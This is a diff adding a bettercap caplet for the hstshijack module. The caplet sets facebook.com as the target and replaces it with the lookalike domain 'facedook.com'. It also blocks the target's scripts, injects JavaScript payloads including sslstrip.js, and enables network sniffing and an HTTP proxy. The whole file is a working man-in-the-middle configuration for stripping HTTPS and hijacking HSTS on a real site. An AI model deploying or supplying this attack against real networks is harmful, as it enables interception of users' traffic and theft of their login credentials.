@@ -1,0 +1,15 @@
+# Documentation can be found at https://github.com/bettercap/caplets/...
+
+set hstshijack.log             caplets/hstshijack/ssl.log
+set hstshijack.payload         caplets/hstshijack/payloads/hstshijack-payload.js
+set hstshijack.ignore          github.com,*.github.com
+set hstshijack.targets         facebook.com,*.facebook.com
+set hstshijack.replacements    facedook.com,*.facedook.com
+set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.custompayloads  *:caplets/hstshijack/payloads/sslstrip.js
+
+set http.proxy.script  caplets/hstshijack/hstshijack.js
+#set net.sniff.output   hstshijack0001.pcap
+set net.sniff.verbose  false
+net.sniff   on
+http.proxy  on
